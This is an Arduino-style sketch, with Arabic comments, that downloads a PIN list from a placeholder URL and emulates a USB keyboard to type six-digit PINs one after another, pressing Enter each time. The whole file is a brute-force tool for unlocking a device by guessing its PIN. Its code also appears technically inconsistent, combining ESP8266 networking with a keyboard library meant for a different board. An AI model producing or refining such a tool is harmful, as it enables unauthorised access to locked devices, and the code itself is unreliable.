#include <ESP8266WiFi.h>
#include <ESP8266HTTPClient.h>
#include "DigiKeyboard.h"

const char* ssid = "YOUR_SSID";          // ضع اسم الشبكة هنا
const char* password = "YOUR_PASSWORD";  // ضع كلمة المرور هنا
const char* url = "http://example.com/pinlist.txt";  // ضع رابط قائمة الأرقام هنا

int num[] = {39, 30, 31, 32, 33, 34, 35, 36, 37, 38}; // keycodes للأرقام من 0-9

String pinList;
int currentPinIndex = 0;
bool key_stroke_f = false;

void setup() {
    Serial.begin(115200);
    DigiKeyboard.update();
    DigiKeyboard.sendKeyStroke(0);
    delay(3000);

    WiFi.begin(ssid, password);
    Serial.print("Connecting to WiFi...");
    while (WiFi.status() != WL_CONNECTED) {
        delay(1000);
        Serial.print(".");
    }
    Serial.println("Connected to WiFi");

    pinList = fetchPinList(url);
}

void loop() {
    if (currentPinIndex >= pinList.length() / 6) {
        Serial.println("All pins tried.");
        while (true) {
            delay(1000);
        }
    }

    String pin = pinList.substring(currentPinIndex * 6, (currentPinIndex + 1) * 6);
    sendPin(pin);
    log_attempt(pin, false);

    delay(1000);
    currentPinIndex++;
}

String fetchPinList(const char* url) {
    HTTPClient http;
    http.begin(url);
    int httpCode = http.GET();

    if (httpCode > 0) {
        if (httpCode == HTTP_CODE_OK) {
            return http.getString();
        }
    }
    http.end();
    return "";
}

void sendPin(String pin) {
    for (int i = 0; i < pin.length(); i++) {
        DigiKeyboard.sendKeyStroke(num[pin[i] - '0']);
    }
    DigiKeyboard.sendKeyStroke(40);
}

void log_attempt(String pin, bool success) {
    Serial.print("Attempt: ");
    Serial.print(pin);
    Serial.print(" - ");
    if (success) {
        Serial.println("SUCCESS");
    } else {
        Serial.println("FAIL");
    }
}
